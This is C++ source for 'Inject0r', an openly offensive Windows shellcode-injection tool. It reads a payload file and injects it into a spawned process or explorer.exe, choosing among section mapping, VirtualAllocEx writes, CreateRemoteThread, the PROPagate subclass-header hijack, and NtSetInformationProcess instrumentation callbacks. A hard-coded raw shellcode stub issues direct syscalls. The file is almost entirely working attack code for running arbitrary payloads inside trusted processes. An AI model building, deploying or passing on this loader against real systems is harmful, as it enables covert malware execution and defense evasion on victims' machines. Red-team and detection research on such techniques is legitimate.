#include "pch.h"

char callback[] = { 0x48,0xba,0xff,0xff,0xff,0xff,0xff,0x7f,0x00,0x00,0x80,0x3a,0x00,0x74,0x02,0xeb,0x34,0x41,0x52,0x50,0x53,0x55,0x57,0x56,0x54,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xec,0x20,0x48,0x8d,0x0d,0xa9,0x01,0x00,0x00,0xe8,0x17,0x00,0x00,0x00,0x48,0x83,0xc4,0x20,0x41,0x5f,0x41,0x5e,0x41,0x5d,0x41,0x5c,0x5c,0x5e,0x5f,0x5d,0x5b,0x58,0x41,0x5a,0x41,0xff,0xe2,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x57,0x48,0x81,0xec,0xa0,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x68,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x70,0x30,0x00,0x00,0x00,0x48,0x8d,0x44,0x24,0x78,0x48,0x89,0xc7,0x31,0xc0,0xb9,0x28,0x00,0x00,0x00,0xf3,0xaa,0xb0,0x01,0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,0x86,0x01,0x0f,0xbe,0xc0,0x83,0xf8,0x01,0x75,0x02,0xeb,0x71,0x48,0xc7,0x44,0x24,0x50,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x40,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xb0,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x20,0x49,0xc7,0xc1,0xff,0xff,0xff,0xff,0x4c,0x8d,0x44,0x24,0x70,0xba,0x00,0x00,0x00,0x20,0x48,0x8d,0x4c,0x24,0x68,0xe8,0x20,0x00,0x00,0x00,0x89,0x44,0x24,0x60,0x83,0x7c,0x24,0x60,0x00,0x74,0x0c,0x31,0xc0,0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,0x86,0x01,0x48,0x81,0xc4,0xa0,0x00,0x00,0x00,0x5f,0xc3,0x65,0x67,0x48,0xa1,0x60,0x00,0x00,0x00,0x81,0xb8,0x20,0x01,0x00,0x00,0x00,0x28,0x00,0x00,0x74,0x64,0x81,0xb8,0x20,0x01,0x00,0x00,0x5a,0x29,0x00,0x00,0x74,0x5f,0x81,0xb8,0x20,0x01,0x00,0x00,0x39,0x38,0x00,0x00,0x74,0x5a,0x81,0xb8,0x20,0x01,0x00,0x00,0xd7,0x3a,0x00,0x00,0x74,0x55,0x81,0xb8,0x20,0x01,0x00,0x00,0xab,0x3f,0x00,0x00,0x74,0x50,0x81,0xb8,0x20,0x01,0x00,0x00,0xee,0x42,0x00,0x00,0x74,0x4b,0x81,0xb8,0x20,0x01,0x00,0x00,0x63,0x45,0x00,0x00,0x74,0x46,0x81,0xb8,0x20,0x01,0x00,0x00,0xba,0x47,0x00,0x00,0x74,0x41,0x81,0xb8,0x20,0x01,0x00,0x00,0xbb,0x47,0x00,0x00,0x74,0x3c,0x7f,0x41,0xeb,0x46,0xb8,0xb3,0x00,0x00,0x00,0xeb,0x44,0xb8,0xb4,0x00,0x00,0x00,0xeb,0x3d,0xb8,0xb6,0x00,0x00,0x00,0xeb,0x36,0xb8,0xb9,0x00,0x00,0x00,0xeb,0x2f,0xb8,0xba,0x00,0x00,0x00,0xeb,0x28,0xb8,0xbb,0x00,0x00,0x00,0xeb,0x21,0xb8,0xbc,0x00,0x00,0x00,0xeb,0x1a,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x13,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x0c,0xb8,0xc1,0x00,0x00,0x00,0xeb,0x05,0xb8,0xff,0xff,0xff,0xff,0x49,0x89,0xca,0x0f,0x05,0xc3,0x90 };
char init_global_vars = '\x00';

int OG(LPVOID buf, int bufSize, ALLOCATIONTYPE allocationType) {
	DWORD				pid;
	HANDLE				hProcess;
	HANDLE				hThread;
	PROCESS_INFORMATION pi;
	LPVOID				pAddress = nullptr;

	ZeroMemory(&pi, sizeof(pi));

	pi = CreateProcessUnderExplorer();
	if (pi.dwProcessId == NULL) {
		printf("[!] Failed to start notepad!\n");
		return 1;
	}

	pid = pi.dwProcessId;
	hProcess = pi.hProcess;

	printf("  |_ Target PID: %d\n", pid);

	pAddress = HandleAllocation(hProcess, buf, bufSize, PAGE_EXECUTE_READWRITE, allocationType);

	if (pAddress == nullptr) {
		return 1;
	}
	printf("  |_ Base Address: %p\n", pAddress);

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
	if (hProcess == NULL) {
		printf("[!] CreateRemoteThread(): %d\n", ::GetLastError());
	}
	printf("  |_ CreateRemoteThread(): %p\n", hThread);
	return 0;
}

int Propagate(LPVOID buf, int bufSize, ALLOCATIONTYPE allocationType) {
	HANDLE          hProcess, hProperty;
	DWORD           pid;
	HWND            hWindow, hChildWindow;
	SUBCLASS_HEADER subclassHeader;
	LPVOID          pSubClassHeader, pPayload;
	SIZE_T          bytesRead, bytesWritten;
	BOOL            bWritten;
	BOOL            bRead;
	BOOL            bSetProp;
	BOOL            bPostMessage;
	BOOL            bFreed;

	// 1. Obtain the parent window handle
	hWindow = FindWindow(L"Progman", NULL);
	if (hWindow == NULL) {
		printf("[!] FindWindow()\n");
		return 1;
	}
	printf("  |_ hWindow: %p\n", hWindow);

	// 2. Obtain the child window handle
	hChildWindow = FindWindowEx(hWindow, NULL, L"SHELLDLL_DefView", NULL);
	if (hChildWindow == NULL) {
		printf("[!] FindWindowEx()\n");
		return 1;
	}
	printf("  |_ hChildWindow: %p\n", hChildWindow);

	// 3. Obtain the handle of subclass header
	hProperty = GetProp(hChildWindow, L"UxSubclassInfo");
	if (hProperty == NULL) {
		printf("[!] GetProp()\n");
		return 1;
	}
	printf("  |_ hProperty: %p\n", hProperty);

	// GetProcessHandleFromHwnd 
	// 4. Obtain the process id for the explorer.exe
	GetWindowThreadProcessId(hChildWindow, &pid);
	if (pid == NULL) {
		printf("[!] GetWindowThreadProcessId()\n");
		return 1;
	}
	printf("  |_ pid: %d\n", pid);

	// 5. Open explorer.exe
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[!] OpenProcess()\n");
		return 1;
	}
	printf("  |_ hProcess: %p\n", hProcess);

	// 6. Read the contents of current subclass header
	bRead = ReadProcessMemory(hProcess, (LPVOID)hProperty, &subclassHeader, sizeof(subclassHeader), &bytesRead);
	if (bRead == FALSE) {
		printf("[!] ReadProcessMemory()\n");
		return 1;
	}
	printf("  |_ ReadProcessMemory()\n");

	// 7. Allocate RW memory for a new subclass header
	pSubClassHeader = VirtualAllocEx(hProcess, NULL, sizeof(subclassHeader), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pSubClassHeader == NULL) {
		printf("[!] VirtualAllocEx()\n");
		return 1;
	}
	printf("  |_ pSubClassHeader: %p\n", pSubClassHeader);

	// 8. Allocate RWX memory for the payload
	pPayload = VirtualAllocEx(hProcess, NULL, bufSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pPayload == NULL) {
		printf("[!] VirtualAllocEx()\n");
		return 1;
	}
	printf("  |_ pPayload: %p\n", pPayload);

	// 9. Write the payload to memory
	bWritten = WriteProcessMemory(hProcess, pPayload, buf, bufSize, &bytesWritten);
	if (bWritten == FALSE) {
		printf("[!] WriteProcessMemory()\n");
		return 1;
	}
	printf("  |_ WriteProcessMemory()\n");

	// 10. Set the pfnSubclass field to payload address, and write back to process in new area of memory
	subclassHeader.CallArray[0].pfnSubclass = (SUBCLASSPROC)pPayload;
	bWritten = WriteProcessMemory(hProcess, pSubClassHeader, &subclassHeader, sizeof(subclassHeader), &bytesWritten);
	if (bWritten == FALSE) {
		printf("[!] WriteProcessMemory()\n");
		return 1;
	}
	printf("  |_ WriteProcessMemory()\n");

	// 11. update the subclass procedure with SetProp
	bSetProp = SetProp(hChildWindow, L"UxSubclassInfo", pSubClassHeader);
	if (bSetProp == FALSE) {
		printf("[!] SetProp()\n");
		return 1;
	}
	printf("  |_ SetProp()\n");

	// 12. Trigger the payload via a windows message
	bPostMessage = PostMessage(hChildWindow, WM_CLOSE, 0, 0);
	if (bPostMessage == FALSE) {
		printf("[!] PostMessage()\n");
		return 1;
	}
	printf("  |_ PostMessage()\n");

	// 13. Restore original subclass header
	bSetProp = SetProp(hChildWindow, L"UxSubclassInfo", hProperty);
	if (bSetProp == FALSE) {
		printf("[!] SetProp()\n");
		return 1;
	}
	printf("  |_ SetProp()\n");

	// 14. free memory and close handles
	bFreed = VirtualFreeEx(hProcess, pSubClassHeader, 0, MEM_DECOMMIT | MEM_RELEASE);
	bFreed = VirtualFreeEx(hProcess, pPayload, 0, MEM_DECOMMIT | MEM_RELEASE);
	CloseHandle(hProcess);
	return 0;
}

int Callbacks(LPVOID buf, int bufSize, ALLOCATIONTYPE allocationType)
{
	LPVOID				pGlobalVar;
	LPVOID				pCallback;
	HANDLE				hProcess;
	DWORD				pid, integrity;
	char*				finalCallback;
	NTSTATUS			status;
	PROCESS_INFORMATION pi;
	wchar_t				privilege[] = L"SeDebugPrivilege";

	integrity = GetCurrentIntegrity();

	if (!SetPrivilege(privilege, TRUE)) {
		printf("[!] SetPrivilege()\n");
		return 1;
	}
	printf("  |_ SetPrivilege()\n");

	if (integrity < SECURITY_MANDATORY_HIGH_RID) {
		printf("[!] Not in high integrity!\n");
		return 1;
	}

	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)ResolveFunction((char*)"NtSetInformationProcess", (char*)"ntdll");
	if (NtSetInformationProcess == NULL) {
		printf("[!] ResolveFunction()\n");
		return 1;
	}

	ZeroMemory(&pi, sizeof(pi));

	pi = CreateProcessUnderExplorer();
	if (pi.dwProcessId == NULL) {
		printf("[!] Failed to start notepad!\n");
		return 1;
	}

	pid = pi.dwProcessId;
	hProcess = pi.hProcess;

	printf("  |_ Target PID: %d\n", pid);

	pGlobalVar = HandleAllocation(hProcess, &init_global_vars, sizeof init_global_vars, PAGE_READWRITE, allocationType);

	if (pGlobalVar == nullptr) {
		return 1;
	}
	printf("  |_ Global Var Address: %p\n", pGlobalVar);

	finalCallback = (char*)malloc(sizeof(callback) + bufSize);
	if (finalCallback == NULL) {
		printf("[!] malloc(): %d\n", ::GetLastError());
		return 1;
	}
	printf("  |_ malloc()\n");

	memcpy((void*)&callback[2], (void*)&pGlobalVar, 8);
	memcpy((void*)finalCallback, (void*)&callback[0], sizeof(callback));
	memcpy((void*)(finalCallback + sizeof(callback)), buf, bufSize);

	pCallback = HandleAllocation(hProcess, finalCallback, sizeof callback + bufSize, PAGE_EXECUTE_READ, allocationType);

	if (pCallback == nullptr) {
		return 1;
	}
	printf("  |_ Callback Address: %p\n", pCallback);

	PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION processCallbackInformation;
	processCallbackInformation.Callback = (PVOID)(ULONG_PTR)pCallback;
	processCallbackInformation.Reserved = 0; // always 0

	if (ARCH == 64)
	{
		processCallbackInformation.Version = 0; // 0 for x64, 1 for x86
	}
	else {
		processCallbackInformation.Version = 1;
	}

	status = NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback, &processCallbackInformation, sizeof(processCallbackInformation));

	if (status != S_OK)
	{
		printf("[!] NtSetInformationProcess(): %d\n", ::GetLastError());
	}
	else
	{
		printf("  |_ NtSetInformationProcess()\n");
	}

	CloseHandle(hProcess);
	printf("|> Done!\n");
	return 0;
}

void Help() {
	printf("|-> Name: Inject0r\n");
	printf("|-> Author: Mez-0\n\n");
	printf("Usage:\n");
	printf("PS C:\\> Inject0r.exe <execution> <allocation> <bin>\n\n");
	printf("Example:\n");
	printf("PS C:\\> Inject0r.exe 1 1 c:\\payload.bin \n\n");
	printf("Allocation Methods:\n");
	printf("|-> 0 == VirtualAllocEx, WriteProcessMemory\n");
	printf("|-> 1 == NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection\n");
	printf("|-> 2 == MapViewOfFile3, CreateFileMapping, UnmapViewOfFile\n\n");
	printf("Execution Methods:\n");
	printf("|-> 0 == CreateRemoteThread\n");
	printf("|-> 1 == Propagate (Injects into EXPLORER.EXE)\n");
	printf("|-> 2 == NtSetInformationProcess Callbacks\n\n");
}

int main(int argc, char** argv)
{
	int		execution, allocation, pid, bufSize;
	char* path;
	LPVOID	buf;

	if (argc < 4)
	{
		Help();
		return 0;
	}
	printf("___________\n");
	printf("|          \n");
	printf("| Inject0r!\n");
	printf("|          \n");

	allocation = atoi(argv[1]);
	execution = atoi(argv[2]);
	path = argv[3];

	EXECUTIONTYPE executionType = (EXECUTIONTYPE)execution;
	ALLOCATIONTYPE allocationType = (ALLOCATIONTYPE)allocation;

	printf("\\_ Path: %s\n", path);

	bufSize = ReadBytes(path, &buf);

	printf("\\_ Size: %d\n", bufSize);

	switch (allocationType)
	{
	case ALLOCATEWITHBASIC:
		printf("\\_ Allocation Method: VirtualAllocEx, WriteProcessMemory\n");
		break;
	case ALLOCATEWITHSECTIONS:
		printf("\\_ Allocation Method: NtCreateSection, NtMapViewOfSection, NtUnmapViewOfSection\n");
		break;
	case ALLOCATEWITHMAPPING:
		printf("\\_ Allocation Method: MapViewOfFile3, CreateFileMapping, UnmapViewOfFile\n\n");
		break;
	}

	switch (executionType)
	{
	case EXECUTEWITHOG:
		printf("\\_ Execution Method: CreateRemoteThread\n");
		OG(buf, bufSize, allocationType);
		break;
	case EXECUTEWITHPROPAGATE:
		printf("\\_ Execution Method: Propagate\n");
		Propagate(buf, bufSize, allocationType);
		break;
	case EXECUTEWITHCALLBACKS:
		printf("\\_ Execution Method: Callbacks\n");
		Callbacks(buf, bufSize, allocationType);
		break;
	}
}